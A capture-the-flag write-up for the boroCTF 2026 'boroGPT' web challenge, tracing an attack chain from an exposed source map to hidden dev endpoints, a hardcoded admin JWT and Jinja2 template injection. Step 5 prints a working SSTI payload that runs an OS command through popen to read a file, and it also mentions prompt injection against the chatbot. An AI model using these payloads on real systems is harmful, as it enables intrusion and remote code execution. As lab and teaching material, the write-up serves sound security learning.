# boroCTF 2026 — boroGPT (Web, 200pts)

**Author:** Solarity  
**Category:** Web  

## Description

> Introducing boroGPT, boroAI's cutting-edge large language model that will revolutionize the way you think about chatbots! Our engineers have been hard at work building the most secure, scalable, and enterprise-ready AI platform the world has ever seen!

## URL

`https://mx7pk2qw9nr4slvt.boroctf.com/`

---

## Solution

### Step 0 — The chatbot is a red herring

The obvious attack vector is prompt injection — trying to manipulate the AI into revealing the flag through the chat interface. The bot responds with a handful of hardcoded phrases and ignores all injection attempts. This is intentional misdirection. The real vulnerability has nothing to do with the LLM.

### Step 1 — Read the page source

The page loads `/static/main.js`. At the very bottom of that file:

```javascript
//# sourceMappingURL=main.js.map
```

This is a standard comment that bundlers (like webpack) add automatically. It tells the browser where to find the **source map** — a file that maps minified/obfuscated code back to the original source files, used by developers for debugging.

The developer forgot to disable source map generation before deploying to production. Navigate to:

```
https://mx7pk2qw9nr4slvt.boroctf.com/static/main.js.map
```

### Step 2 — Extract hidden endpoints from source map

The source map contains the original unobfuscated source code in `sourcesContent`. Inside `src/api/client.js`:

```javascript
// Legacy dev client - DO NOT SHIP
const devFetch = (endpoint, options = {}) => {
  return fetch(endpoint, {
    ...options,
    headers: {
      ...options.headers,
      "X-Dev-Mode": "true"
    }
  });
};

export const getUsers = () => devFetch("/api/v0/users");
export const renderTemplate = (template, token) => devFetch("/api/v0/render", {
  method: "POST",
  headers: { "Authorization": `Bearer ${token}` },
  body: JSON.stringify({ template })
});
export const getJWKS = () => devFetch("/api/v0/jwks");
```

Three hidden legacy endpoints, all requiring the `X-Dev-Mode: true` header.

### Step 3 — Get admin token from `/api/v0/users`

Call the users endpoint from the browser console (on the main page):

```javascript
fetch('/api/v0/users', {
  headers: {'X-Dev-Mode': 'true'}
}).then(r => r.json()).then(console.log)
```

The response includes four users. The admin record contains a hardcoded debug token:

```json
{
  "_note": "debug session token",
  "email": "admin@borocorp.io",
  "id": 4,
  "role": "admin",
  "sample_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...",
  "username": "admin"
}
```

This is a **JWT (JSON Web Token)** — a token that proves identity to the server. Normally the server would generate it after login. Here it was hardcoded in the user data by a developer "for debugging."

### Step 4 — Confirm SSTI on `/api/v0/render`

The `renderTemplate` function posts a `template` field to `/api/v0/render`. This endpoint passes the template through a Jinja2 engine — the same SSTI vulnerability as in the NERV challenge.

Test with `{{7*7}}`:

```javascript
fetch('/api/v0/render', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'X-Dev-Mode': 'true',
    'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...'
  },
  body: JSON.stringify({template: '{{7*7}}'})
}).then(r => r.text()).then(console.log)
```

Output: `{"output":"49"}` — Jinja2 is executing our input.

### Step 5 — Read the flag

Use the same SSTI payload as in NERV to execute a system command:

```javascript
fetch('/api/v0/render', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'X-Dev-Mode': 'true',
    'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...'
  },
  body: JSON.stringify({template: "{{request.application.__globals__.__builtins__.__import__('os').popen('cat /flag.txt').read()}}"})
}).then(r => r.text()).then(console.log)
```

Output: `{"output":"boroCTF{pub1ic_k3y_g0es_both_ways}"}`

---

## Flag

```
boroCTF{pub1ic_k3y_g0es_both_ways}
```

---

## Key takeaways

- **Source maps should never be deployed to production.** `//# sourceMappingURL=main.js.map` at the bottom of a JS file means anyone can download the original unobfuscated source — including comments like `// DO NOT SHIP` and hidden endpoints
- The attack chain: source map → hidden endpoints → hardcoded admin token → SSTI → RCE
- The flag name `pub1ic_k3y_g0es_both_ways` refers to the JWKS public key — normally used only to *verify* JWTs, but since the token was hardcoded in `/api/v0/users`, the cryptographic verification was meaningless
- Hardcoded debug tokens in API responses are a critical vulnerability — they bypass all authentication regardless of how strong the JWT signing algorithm is
